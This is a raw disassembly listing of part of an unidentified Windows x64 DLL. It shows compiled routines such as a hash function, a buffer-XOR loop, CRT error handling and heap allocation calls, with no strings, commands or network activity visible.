   180001eae:	8d 57 2e             	lea    0x2e(%rdi),%edx
   180001eb1:	49 8b ce             	mov    %r14,%rcx
   180001eb4:	e8 9f 2d 00 00       	call   0x180004c58
   180001eb9:	8d 57 22             	lea    0x22(%rdi),%edx
   180001ebc:	48 8b c8             	mov    %rax,%rcx
   180001ebf:	48 8b d8             	mov    %rax,%rbx
   180001ec2:	e8 91 2d 00 00       	call   0x180004c58
   180001ec7:	48 8b f8             	mov    %rax,%rdi
   180001eca:	b9 08 00 00 00       	mov    $0x8,%ecx
   180001ecf:	33 c0                	xor    %eax,%eax
   180001ed1:	f3 aa                	rep stos %al,(%rdi)
   180001ed3:	48 8b c3             	mov    %rbx,%rax
   180001ed6:	eb 1d                	jmp    0x180001ef5
   180001ed8:	48 8b ce             	mov    %rsi,%rcx
   180001edb:	ff 15 77 24 01 00    	call   *0x12477(%rip)        # 0x180014358
   180001ee1:	49 8b cc             	mov    %r12,%rcx
   180001ee4:	ff 15 6e 24 01 00    	call   *0x1246e(%rip)        # 0x180014358
   180001eea:	49 8b cf             	mov    %r15,%rcx
   180001eed:	ff 15 65 24 01 00    	call   *0x12465(%rip)        # 0x180014358
   180001ef3:	33 c0                	xor    %eax,%eax
   180001ef5:	4c 8b a4 24 c8 03 00 	mov    0x3c8(%rsp),%r12
   180001efc:	00 
   180001efd:	48 8b b4 24 c0 03 00 	mov    0x3c0(%rsp),%rsi
   180001f04:	00 
   180001f05:	48 8b 8d 80 02 00 00 	mov    0x280(%rbp),%rcx
   180001f0c:	48 33 cc             	xor    %rsp,%rcx
   180001f0f:	e8 9c 1c 00 00       	call   0x180003bb0
   180001f14:	48 8b 9c 24 d0 03 00 	mov    0x3d0(%rsp),%rbx
   180001f1b:	00 
   180001f1c:	48 81 c4 90 03 00 00 	add    $0x390,%rsp
   180001f23:	41 5f                	pop    %r15
   180001f25:	41 5e                	pop    %r14
   180001f27:	41 5d                	pop    %r13
   180001f29:	5f                   	pop    %rdi
   180001f2a:	5d                   	pop    %rbp
   180001f2b:	c3                   	ret
   180001f2c:	cc                   	int3
   180001f2d:	cc                   	int3
   180001f2e:	cc                   	int3
   180001f2f:	cc                   	int3
   180001f30:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180001f35:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180001f3a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180001f3f:	53                   	push   %rbx
   180001f40:	56                   	push   %rsi
   180001f41:	57                   	push   %rdi
   180001f42:	48 83 ec 30          	sub    $0x30,%rsp
   180001f46:	48 8b da             	mov    %rdx,%rbx
   180001f49:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   180001f4e:	48 8b f9             	mov    %rcx,%rdi
   180001f51:	e8 aa f0 ff ff       	call   0x180001000
   180001f56:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   180001f5b:	4c 8b cb             	mov    %rbx,%r9
   180001f5e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001f64:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180001f6b:	00 00 
   180001f6d:	48 8b d7             	mov    %rdi,%rdx
   180001f70:	48 8b 08             	mov    (%rax),%rcx
   180001f73:	e8 64 56 00 00       	call   0x1800075dc
   180001f78:	83 c9 ff             	or     $0xffffffff,%ecx
   180001f7b:	85 c0                	test   %eax,%eax
   180001f7d:	0f 48 c1             	cmovs  %ecx,%eax
   180001f80:	48 83 c4 30          	add    $0x30,%rsp
   180001f84:	5f                   	pop    %rdi
   180001f85:	5e                   	pop    %rsi
   180001f86:	5b                   	pop    %rbx
   180001f87:	c3                   	ret
   180001f88:	cc                   	int3
   180001f89:	cc                   	int3
   180001f8a:	cc                   	int3
   180001f8b:	cc                   	int3
   180001f8c:	cc                   	int3
   180001f8d:	cc                   	int3
   180001f8e:	cc                   	int3
   180001f8f:	cc                   	int3
   180001f90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001f95:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180001f9a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001f9f:	57                   	push   %rdi
   180001fa0:	48 83 ec 70          	sub    $0x70,%rsp
   180001fa4:	48 8b 05 5d d0 01 00 	mov    0x1d05d(%rip),%rax        # 0x18001f008
   180001fab:	48 33 c4             	xor    %rsp,%rax
   180001fae:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180001fb3:	44 8b 09             	mov    (%rcx),%r9d
   180001fb6:	33 ff                	xor    %edi,%edi
   180001fb8:	4c 01 01             	add    %r8,(%rcx)
   180001fbb:	41 83 e1 3f          	and    $0x3f,%r9d
   180001fbf:	49 8b f0             	mov    %r8,%rsi
   180001fc2:	48 8b ea             	mov    %rdx,%rbp
   180001fc5:	48 8b d9             	mov    %rcx,%rbx
   180001fc8:	4d 85 c0             	test   %r8,%r8
   180001fcb:	0f 84 99 00 00 00    	je     0x18000206a
   180001fd1:	33 c0                	xor    %eax,%eax
   180001fd3:	0f 1f 40 00          	nopl   0x0(%rax)
   180001fd7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180001fde:	00 00 
   180001fe0:	0f b6 04 28          	movzbl (%rax,%rbp,1),%eax
   180001fe4:	41 88 44 19 18       	mov    %al,0x18(%r9,%rbx,1)
   180001fe9:	41 ff c1             	inc    %r9d
   180001fec:	41 f6 c1 3f          	test   $0x3f,%r9b
   180001ff0:	75 6b                	jne    0x18000205d
   180001ff2:	45 33 c9             	xor    %r9d,%r9d
   180001ff5:	4c 8d 54 24 20       	lea    0x20(%rsp),%r10
   180001ffa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180002000:	42 8d 14 8d 00 00 00 	lea    0x0(,%r9,4),%edx
   180002007:	00 
   180002008:	41 ff c1             	inc    %r9d
   18000200b:	0f b6 4c 1a 18       	movzbl 0x18(%rdx,%rbx,1),%ecx
   180002010:	8d 42 03             	lea    0x3(%rdx),%eax
   180002013:	44 0f b6 44 18 18    	movzbl 0x18(%rax,%rbx,1),%r8d
   180002019:	4d 8d 52 04          	lea    0x4(%r10),%r10
   18000201d:	41 c1 e0 08          	shl    $0x8,%r8d
   180002021:	8d 42 02             	lea    0x2(%rdx),%eax
   180002024:	0f b6 44 18 18       	movzbl 0x18(%rax,%rbx,1),%eax
   180002029:	44 0b c0             	or     %eax,%r8d
   18000202c:	8d 42 01             	lea    0x1(%rdx),%eax
   18000202f:	41 c1 e0 08          	shl    $0x8,%r8d
   180002033:	0f b6 44 18 18       	movzbl 0x18(%rax,%rbx,1),%eax
   180002038:	44 0b c0             	or     %eax,%r8d
   18000203b:	41 c1 e0 08          	shl    $0x8,%r8d
   18000203f:	44 0b c1             	or     %ecx,%r8d
   180002042:	45 89 42 fc          	mov    %r8d,-0x4(%r10)
   180002046:	41 83 f9 10          	cmp    $0x10,%r9d
   18000204a:	72 b4                	jb     0x180002000
   18000204c:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180002050:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002055:	e8 76 01 00 00       	call   0x1800021d0
   18000205a:	45 33 c9             	xor    %r9d,%r9d
   18000205d:	ff c7                	inc    %edi
   18000205f:	8b c7                	mov    %edi,%eax
   180002061:	48 3b c6             	cmp    %rsi,%rax
   180002064:	0f 82 76 ff ff ff    	jb     0x180001fe0
   18000206a:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   18000206f:	48 33 cc             	xor    %rsp,%rcx
   180002072:	e8 39 1b 00 00       	call   0x180003bb0
   180002077:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   18000207c:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180002080:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   180002084:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180002088:	49 8b e3             	mov    %r11,%rsp
   18000208b:	5f                   	pop    %rdi
   18000208c:	c3                   	ret
   18000208d:	cc                   	int3
   18000208e:	cc                   	int3
   18000208f:	cc                   	int3
   180002090:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002095:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000209a:	57                   	push   %rdi
   18000209b:	48 83 ec 70          	sub    $0x70,%rsp
   18000209f:	48 8b 05 62 cf 01 00 	mov    0x1cf62(%rip),%rax        # 0x18001f008
   1800020a6:	48 33 c4             	xor    %rsp,%rax
   1800020a9:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800020ae:	8b 11                	mov    (%rcx),%edx
   1800020b0:	48 8b d9             	mov    %rcx,%rbx
   1800020b3:	83 e2 3f             	and    $0x3f,%edx
   1800020b6:	b9 38 00 00 00       	mov    $0x38,%ecx
   1800020bb:	2b ca                	sub    %edx,%ecx
   1800020bd:	b8 78 00 00 00       	mov    $0x78,%eax
   1800020c2:	2b c2                	sub    %edx,%eax
   1800020c4:	83 fa 38             	cmp    $0x38,%edx
   1800020c7:	48 8d 15 d2 e0 01 00 	lea    0x1e0d2(%rip),%rdx        # 0x1800201a0
   1800020ce:	0f 42 c1             	cmovb  %ecx,%eax
   1800020d1:	48 8b cb             	mov    %rbx,%rcx
   1800020d4:	44 8b c0             	mov    %eax,%r8d
   1800020d7:	8b f8                	mov    %eax,%edi
   1800020d9:	e8 b2 fe ff ff       	call   0x180001f90
   1800020de:	48 29 3b             	sub    %rdi,(%rbx)
   1800020e1:	4c 8d 54 24 20       	lea    0x20(%rsp),%r10
   1800020e6:	4c 8b 1b             	mov    (%rbx),%r11
   1800020e9:	33 f6                	xor    %esi,%esi
   1800020eb:	44 8b ce             	mov    %esi,%r9d
   1800020ee:	66 90                	xchg   %ax,%ax
   1800020f0:	42 8d 14 8d 00 00 00 	lea    0x0(,%r9,4),%edx
   1800020f7:	00 
   1800020f8:	41 ff c1             	inc    %r9d
   1800020fb:	0f b6 4c 1a 18       	movzbl 0x18(%rdx,%rbx,1),%ecx
   180002100:	8d 42 03             	lea    0x3(%rdx),%eax
   180002103:	44 0f b6 44 18 18    	movzbl 0x18(%rax,%rbx,1),%r8d
   180002109:	4d 8d 52 04          	lea    0x4(%r10),%r10
   18000210d:	41 c1 e0 08          	shl    $0x8,%r8d
   180002111:	8d 42 02             	lea    0x2(%rdx),%eax
   180002114:	0f b6 44 18 18       	movzbl 0x18(%rax,%rbx,1),%eax
   180002119:	44 0b c0             	or     %eax,%r8d
   18000211c:	8d 42 01             	lea    0x1(%rdx),%eax
   18000211f:	41 c1 e0 08          	shl    $0x8,%r8d
   180002123:	0f b6 44 18 18       	movzbl 0x18(%rax,%rbx,1),%eax
   180002128:	44 0b c0             	or     %eax,%r8d
   18000212b:	41 c1 e0 08          	shl    $0x8,%r8d
   18000212f:	44 0b c1             	or     %ecx,%r8d
   180002132:	45 89 42 fc          	mov    %r8d,-0x4(%r10)
   180002136:	41 83 f9 0e          	cmp    $0xe,%r9d
   18000213a:	72 b4                	jb     0x1800020f0
   18000213c:	41 8b c3             	mov    %r11d,%eax
   18000213f:	48 8d 7b 08          	lea    0x8(%rbx),%rdi
   180002143:	c1 e0 03             	shl    $0x3,%eax
   180002146:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000214b:	89 44 24 58          	mov    %eax,0x58(%rsp)
   18000214f:	48 8b cf             	mov    %rdi,%rcx
   180002152:	4a 8d 04 dd 00 00 00 	lea    0x0(,%r11,8),%rax
   180002159:	00 
   18000215a:	48 c1 e8 20          	shr    $0x20,%rax
   18000215e:	89 44 24 5c          	mov    %eax,0x5c(%rsp)
   180002162:	e8 69 00 00 00       	call   0x1800021d0
   180002167:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000216e:	00 00 
   180002170:	0f b6 07             	movzbl (%rdi),%eax
   180002173:	44 8d 04 b5 00 00 00 	lea    0x0(,%rsi,4),%r8d
   18000217a:	00 
   18000217b:	41 88 44 18 58       	mov    %al,0x58(%r8,%rbx,1)
   180002180:	41 8d 48 02          	lea    0x2(%r8),%ecx
   180002184:	8b 17                	mov    (%rdi),%edx
   180002186:	41 8d 40 01          	lea    0x1(%r8),%eax
   18000218a:	c1 ea 08             	shr    $0x8,%edx
   18000218d:	48 8d 7f 04          	lea    0x4(%rdi),%rdi
   180002191:	88 54 18 58          	mov    %dl,0x58(%rax,%rbx,1)
   180002195:	ff c6                	inc    %esi
   180002197:	0f b6 47 fe          	movzbl -0x2(%rdi),%eax
   18000219b:	88 44 19 58          	mov    %al,0x58(%rcx,%rbx,1)
   18000219f:	41 8d 48 03          	lea    0x3(%r8),%ecx
   1800021a3:	0f b6 47 ff          	movzbl -0x1(%rdi),%eax
   1800021a7:	88 44 19 58          	mov    %al,0x58(%rcx,%rbx,1)
   1800021ab:	83 fe 04             	cmp    $0x4,%esi
   1800021ae:	72 c0                	jb     0x180002170
   1800021b0:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1800021b5:	48 33 cc             	xor    %rsp,%rcx
   1800021b8:	e8 f3 19 00 00       	call   0x180003bb0
   1800021bd:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1800021c2:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1800021c6:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1800021ca:	49 8b e3             	mov    %r11,%rsp
   1800021cd:	5f                   	pop    %rdi
   1800021ce:	c3                   	ret
   1800021cf:	cc                   	int3
   1800021d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800021d5:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1800021da:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800021df:	56                   	push   %rsi
   1800021e0:	57                   	push   %rdi
   1800021e1:	41 54                	push   %r12
   1800021e3:	41 55                	push   %r13
   1800021e5:	41 56                	push   %r14
   1800021e7:	41 57                	push   %r15
   1800021e9:	44 8b 39             	mov    (%rcx),%r15d
   1800021ec:	45 33 c9             	xor    %r9d,%r9d
   1800021ef:	44 8b 61 04          	mov    0x4(%rcx),%r12d
   1800021f3:	45 8b f1             	mov    %r9d,%r14d
   1800021f6:	8b 69 08             	mov    0x8(%rcx),%ebp
   1800021f9:	48 8b f9             	mov    %rcx,%rdi
   1800021fc:	44 8b 69 0c          	mov    0xc(%rcx),%r13d
   180002200:	45 8b d4             	mov    %r12d,%r10d
   180002203:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
   180002208:	8b dd                	mov    %ebp,%ebx
   18000220a:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   18000220f:	45 8b dd             	mov    %r13d,%r11d
   180002212:	41 8b c1             	mov    %r9d,%eax
   180002215:	c1 e8 04             	shr    $0x4,%eax
   180002218:	85 c0                	test   %eax,%eax
   18000221a:	74 51                	je     0x18000226d
   18000221c:	83 e8 01             	sub    $0x1,%eax
   18000221f:	74 2d                	je     0x18000224e
   180002221:	83 f8 01             	cmp    $0x1,%eax
   180002224:	41 8b c3             	mov    %r11d,%eax
   180002227:	74 10                	je     0x180002239
   180002229:	f7 d0                	not    %eax
   18000222b:	41 6b c9 07          	imul   $0x7,%r9d,%ecx
   18000222f:	41 0b c2             	or     %r10d,%eax
   180002232:	33 c3                	xor    %ebx,%eax
   180002234:	83 e1 0f             	and    $0xf,%ecx
   180002237:	eb 46                	jmp    0x18000227f
   180002239:	33 c3                	xor    %ebx,%eax
   18000223b:	42 8d 0c 4d 05 00 00 	lea    0x5(,%r9,2),%ecx
   180002242:	00 
   180002243:	41 33 c2             	xor    %r10d,%eax
   180002246:	41 03 c9             	add    %r9d,%ecx
   180002249:	83 e1 0f             	and    $0xf,%ecx
   18000224c:	eb 31                	jmp    0x18000227f
   18000224e:	41 8b c3             	mov    %r11d,%eax
   180002251:	41 8b cb             	mov    %r11d,%ecx
   180002254:	41 23 ca             	and    %r10d,%ecx
   180002257:	f7 d0                	not    %eax
   180002259:	23 c3                	and    %ebx,%eax
   18000225b:	0b c1                	or     %ecx,%eax
   18000225d:	42 8d 0c 8d 01 00 00 	lea    0x1(,%r9,4),%ecx
   180002264:	00 
   180002265:	41 03 c9             	add    %r9d,%ecx
   180002268:	83 e1 0f             	and    $0xf,%ecx
   18000226b:	eb 12                	jmp    0x18000227f
   18000226d:	41 8b c2             	mov    %r10d,%eax
   180002270:	8b cb                	mov    %ebx,%ecx
   180002272:	f7 d0                	not    %eax
   180002274:	41 23 ca             	and    %r10d,%ecx
   180002277:	41 23 c3             	and    %r11d,%eax
   18000227a:	0b c1                	or     %ecx,%eax
   18000227c:	41 8b c9             	mov    %r9d,%ecx
   18000227f:	8b d1                	mov    %ecx,%edx
   180002281:	41 8b f3             	mov    %r11d,%esi
   180002284:	44 8b db             	mov    %ebx,%r11d
   180002287:	41 ff c1             	inc    %r9d
   18000228a:	41 8b da             	mov    %r10d,%ebx
   18000228d:	45 8b 04 97          	mov    (%r15,%rdx,4),%r8d
   180002291:	48 8d 15 68 dd ff ff 	lea    -0x2298(%rip),%rdx        # 0x180000000
   180002298:	45 03 84 16 f0 be 01 	add    0x1bef0(%r14,%rdx,1),%r8d
   18000229f:	00 
   1800022a0:	41 8b 8c 16 f0 bf 01 	mov    0x1bff0(%r14,%rdx,1),%ecx
   1800022a7:	00 
   1800022a8:	44 03 c0             	add    %eax,%r8d
   1800022ab:	44 03 44 24 38       	add    0x38(%rsp),%r8d
   1800022b0:	49 83 c6 04          	add    $0x4,%r14
   1800022b4:	41 d3 c0             	rol    %cl,%r8d
   1800022b7:	45 03 d0             	add    %r8d,%r10d
   1800022ba:	89 74 24 38          	mov    %esi,0x38(%rsp)
   1800022be:	41 83 f9 40          	cmp    $0x40,%r9d
   1800022c2:	0f 82 4a ff ff ff    	jb     0x180002212
   1800022c8:	01 37                	add    %esi,(%rdi)
   1800022ca:	43 8d 04 14          	lea    (%r12,%r10,1),%eax
   1800022ce:	89 47 04             	mov    %eax,0x4(%rdi)
   1800022d1:	8d 04 2b             	lea    (%rbx,%rbp,1),%eax
   1800022d4:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1800022d9:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1800022de:	89 47 08             	mov    %eax,0x8(%rdi)
   1800022e1:	43 8d 04 2b          	lea    (%r11,%r13,1),%eax
   1800022e5:	89 47 0c             	mov    %eax,0xc(%rdi)
   1800022e8:	41 5f                	pop    %r15
   1800022ea:	41 5e                	pop    %r14
   1800022ec:	41 5d                	pop    %r13
   1800022ee:	41 5c                	pop    %r12
   1800022f0:	5f                   	pop    %rdi
   1800022f1:	5e                   	pop    %rsi
   1800022f2:	c3                   	ret
   1800022f3:	cc                   	int3
   1800022f4:	cc                   	int3
   1800022f5:	cc                   	int3
   1800022f6:	cc                   	int3
   1800022f7:	cc                   	int3
   1800022f8:	cc                   	int3
   1800022f9:	cc                   	int3
   1800022fa:	cc                   	int3
   1800022fb:	cc                   	int3
   1800022fc:	cc                   	int3
   1800022fd:	cc                   	int3
   1800022fe:	cc                   	int3
   1800022ff:	cc                   	int3
   180002300:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180002305:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000230a:	53                   	push   %rbx
   18000230b:	55                   	push   %rbp
   18000230c:	56                   	push   %rsi
   18000230d:	57                   	push   %rdi
   18000230e:	48 83 ec 38          	sub    $0x38,%rsp
   180002312:	49 8b f0             	mov    %r8,%rsi
   180002315:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   18000231a:	48 8b fa             	mov    %rdx,%rdi
   18000231d:	48 8b d9             	mov    %rcx,%rbx
   180002320:	e8 db ec ff ff       	call   0x180001000
   180002325:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   18000232a:	4c 8b ce             	mov    %rsi,%r9
   18000232d:	4c 8b c7             	mov    %rdi,%r8
   180002330:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002337:	00 00 
   180002339:	48 8b d3             	mov    %rbx,%rdx
   18000233c:	48 8b 08             	mov    (%rax),%rcx
   18000233f:	48 83 c9 02          	or     $0x2,%rcx
   180002343:	e8 8c 52 00 00       	call   0x1800075d4
   180002348:	83 c9 ff             	or     $0xffffffff,%ecx
   18000234b:	85 c0                	test   %eax,%eax
   18000234d:	0f 48 c1             	cmovs  %ecx,%eax
   180002350:	48 83 c4 38          	add    $0x38,%rsp
   180002354:	5f                   	pop    %rdi
   180002355:	5e                   	pop    %rsi
   180002356:	5d                   	pop    %rbp
   180002357:	5b                   	pop    %rbx
   180002358:	c3                   	ret
   180002359:	cc                   	int3
   18000235a:	cc                   	int3
   18000235b:	cc                   	int3
   18000235c:	cc                   	int3
   18000235d:	cc                   	int3
   18000235e:	cc                   	int3
   18000235f:	cc                   	int3
   180002360:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002365:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000236a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000236f:	57                   	push   %rdi
   180002370:	41 56                	push   %r14
   180002372:	41 57                	push   %r15
   180002374:	48 83 ec 20          	sub    $0x20,%rsp
   180002378:	48 63 ea             	movslq %edx,%rbp
   18000237b:	4d 8b f0             	mov    %r8,%r14
   18000237e:	4d 63 f9             	movslq %r9d,%r15
   180002381:	48 8b f5             	mov    %rbp,%rsi
   180002384:	48 8b f9             	mov    %rcx,%rdi
   180002387:	48 85 c9             	test   %rcx,%rcx
   18000238a:	75 0d                	jne    0x180002399
   18000238c:	e8 07 5d 00 00       	call   0x180008098
   180002391:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180002397:	eb 30                	jmp    0x1800023c9
   180002399:	48 83 fe 14          	cmp    $0x14,%rsi
   18000239d:	72 15                	jb     0x1800023b4
   18000239f:	0f 10 05 22 df 01 00 	movups 0x1df22(%rip),%xmm0        # 0x1800202c8
   1800023a6:	0f 11 01             	movups %xmm0,(%rcx)
   1800023a9:	8b 05 29 df 01 00    	mov    0x1df29(%rip),%eax        # 0x1800202d8
   1800023af:	89 41 10             	mov    %eax,0x10(%rcx)
   1800023b2:	eb 1a                	jmp    0x1800023ce
   1800023b4:	4c 8b c6             	mov    %rsi,%r8
   1800023b7:	33 d2                	xor    %edx,%edx
   1800023b9:	e8 12 2f 00 00       	call   0x1800052d0
   1800023be:	e8 d5 5c 00 00       	call   0x180008098
   1800023c3:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   1800023c9:	e8 0e 5b 00 00       	call   0x180007edc
   1800023ce:	48 83 c6 ec          	add    $0xffffffffffffffec,%rsi
   1800023d2:	48 8d 4f 14          	lea    0x14(%rdi),%rcx
   1800023d6:	49 8b df             	mov    %r15,%rbx
   1800023d9:	45 85 ff             	test   %r15d,%r15d
   1800023dc:	74 5a                	je     0x180002438
   1800023de:	48 85 c9             	test   %rcx,%rcx
   1800023e1:	75 0d                	jne    0x1800023f0
   1800023e3:	e8 b0 5c 00 00       	call   0x180008098
   1800023e8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1800023ee:	eb 43                	jmp    0x180002433
   1800023f0:	4d 85 f6             	test   %r14,%r14
   1800023f3:	74 12                	je     0x180002407
   1800023f5:	48 3b f3             	cmp    %rbx,%rsi
   1800023f8:	72 0d                	jb     0x180002407
   1800023fa:	4c 8b c3             	mov    %rbx,%r8
   1800023fd:	49 8b d6             	mov    %r14,%rdx
   180002400:	e8 3b 03 01 00       	call   0x180012740
   180002405:	eb 31                	jmp    0x180002438
   180002407:	4c 8b c6             	mov    %rsi,%r8
   18000240a:	33 d2                	xor    %edx,%edx
   18000240c:	e8 bf 2e 00 00       	call   0x1800052d0
   180002411:	4d 85 f6             	test   %r14,%r14
   180002414:	75 0d                	jne    0x180002423
   180002416:	e8 7d 5c 00 00       	call   0x180008098
   18000241b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180002421:	eb 10                	jmp    0x180002433
   180002423:	48 3b f3             	cmp    %rbx,%rsi
   180002426:	73 10                	jae    0x180002438
   180002428:	e8 6b 5c 00 00       	call   0x180008098
   18000242d:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   180002433:	e8 a4 5a 00 00       	call   0x180007edc
   180002438:	41 2b ef             	sub    %r15d,%ebp
   18000243b:	48 8d 4f 14          	lea    0x14(%rdi),%rcx
   18000243f:	4c 63 c5             	movslq %ebp,%r8
   180002442:	49 83 e8 14          	sub    $0x14,%r8
   180002446:	48 03 cb             	add    %rbx,%rcx
   180002449:	75 0d                	jne    0x180002458
   18000244b:	e8 48 5c 00 00       	call   0x180008098
   180002450:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180002456:	eb 2d                	jmp    0x180002485
   180002458:	49 83 f8 14          	cmp    $0x14,%r8
   18000245c:	72 15                	jb     0x180002473
   18000245e:	0f 10 05 c3 dd 01 00 	movups 0x1ddc3(%rip),%xmm0        # 0x180020228
   180002465:	0f 11 01             	movups %xmm0,(%rcx)
   180002468:	8b 05 ca dd 01 00    	mov    0x1ddca(%rip),%eax        # 0x180020238
   18000246e:	89 41 10             	mov    %eax,0x10(%rcx)
   180002471:	eb 17                	jmp    0x18000248a
   180002473:	33 d2                	xor    %edx,%edx
   180002475:	e8 56 2e 00 00       	call   0x1800052d0
   18000247a:	e8 19 5c 00 00       	call   0x180008098
   18000247f:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   180002485:	e8 52 5a 00 00       	call   0x180007edc
   18000248a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000248f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180002494:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180002499:	48 83 c4 20          	add    $0x20,%rsp
   18000249d:	41 5f                	pop    %r15
   18000249f:	41 5e                	pop    %r14
   1800024a1:	5f                   	pop    %rdi
   1800024a2:	c3                   	ret
   1800024a3:	cc                   	int3
   1800024a4:	cc                   	int3
   1800024a5:	cc                   	int3
   1800024a6:	cc                   	int3
   1800024a7:	cc                   	int3
   1800024a8:	cc                   	int3
   1800024a9:	cc                   	int3
   1800024aa:	cc                   	int3
   1800024ab:	cc                   	int3
   1800024ac:	cc                   	int3
   1800024ad:	cc                   	int3
   1800024ae:	cc                   	int3
   1800024af:	cc                   	int3
   1800024b0:	40 53                	rex push %rbx
   1800024b2:	57                   	push   %rdi
   1800024b3:	41 54                	push   %r12
   1800024b5:	41 56                	push   %r14
   1800024b7:	41 57                	push   %r15
   1800024b9:	48 81 ec 50 05 00 00 	sub    $0x550,%rsp
   1800024c0:	48 8b 05 41 cb 01 00 	mov    0x1cb41(%rip),%rax        # 0x18001f008
   1800024c7:	48 33 c4             	xor    %rsp,%rax
   1800024ca:	48 89 84 24 40 05 00 	mov    %rax,0x540(%rsp)
   1800024d1:	00 
   1800024d2:	8b da                	mov    %edx,%ebx
   1800024d4:	45 33 e4             	xor    %r12d,%r12d
   1800024d7:	4c 8b f9             	mov    %rcx,%r15
   1800024da:	8d 43 d8             	lea    -0x28(%rbx),%eax
   1800024dd:	4c 63 d0             	movslq %eax,%r10
   1800024e0:	ff c8                	dec    %eax
   1800024e2:	4c 63 d8             	movslq %eax,%r11
   1800024e5:	85 c0                	test   %eax,%eax
   1800024e7:	7e 50                	jle    0x180002539
   1800024e9:	41 8b d4             	mov    %r12d,%edx
   1800024ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1800024f0:	4d 8b c8             	mov    %r8,%r9
   1800024f3:	41 8b fc             	mov    %r12d,%edi
   1800024f6:	4c 2b ca             	sub    %rdx,%r9
   1800024f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002500:	49 3b d2             	cmp    %r10,%rdx
   180002503:	7d 2f                	jge    0x180002534
   180002505:	41 0f b6 04 11       	movzbl (%r9,%rdx,1),%eax
   18000250a:	ff c7                	inc    %edi
   18000250c:	42 30 44 3a 15       	xor    %al,0x15(%rdx,%r15,1)
   180002511:	48 ff c2             	inc    %rdx
   180002514:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180002518:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000251f:	00 
   180002520:	48 ff c0             	inc    %rax
   180002523:	45 38 24 00          	cmp    %r12b,(%r8,%rax,1)
   180002527:	75 f7                	jne    0x180002520
   180002529:	48 ff c8             	dec    %rax
   18000252c:	48 63 cf             	movslq %edi,%rcx
   18000252f:	48 3b c8             	cmp    %rax,%rcx
   180002532:	76 cc                	jbe    0x180002500
   180002534:	49 3b d3             	cmp    %r11,%rdx
   180002537:	7c b7                	jl     0x1800024f0
   180002539:	44 8d 04 9d 00 00 00 	lea    0x0(,%rbx,4),%r8d
   180002540:	00 
   180002541:	b9 00 00 04 00       	mov    $0x40000,%ecx
   180002546:	8d 14 1b             	lea    (%rbx,%rbx,1),%edx
   180002549:	ff 15 f9 1b 01 00    	call   *0x11bf9(%rip)        # 0x180014148
   18000254f:	48 85 c0             	test   %rax,%rax
   180002552:	0f 84 2a 01 00 00    	je     0x180002682
   180002558:	44 8d 83 5d 0d 00 00 	lea    0xd5d(%rbx),%r8d
   18000255f:	48 89 b4 24 98 05 00 	mov    %rsi,0x598(%rsp)
   180002566:	00 
   180002567:	ba 08 00 00 00       	mov    $0x8,%edx
   18000256c:	48 8b c8             	mov    %rax,%rcx
   18000256f:	ff 15 4b 1b 01 00    	call   *0x11b4b(%rip)        # 0x1800140c0
   180002575:	48 8b f0             	mov    %rax,%rsi
   180002578:	48 85 c0             	test   %rax,%rax
   18000257b:	0f 84 f9 00 00 00    	je     0x18000267a
   180002581:	48 89 ac 24 90 05 00 	mov    %rbp,0x590(%rsp)
